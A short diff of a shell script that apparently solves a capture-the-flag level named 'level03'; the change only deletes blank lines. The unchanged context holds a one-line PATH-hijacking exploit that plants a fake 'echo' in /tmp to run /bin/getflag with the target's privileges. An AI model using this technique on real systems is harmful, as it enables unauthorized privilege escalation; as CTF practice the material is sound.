@@ -6,8 +6,6 @@ else
 	ROOT_DIR=$(dirname $(dirname $(dirname "$0")))
 fi
 
-
-
 SCRIPT="echo \"/bin/getflag\" > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp;./level03"
 
 if [ ! -z "$1" ];then
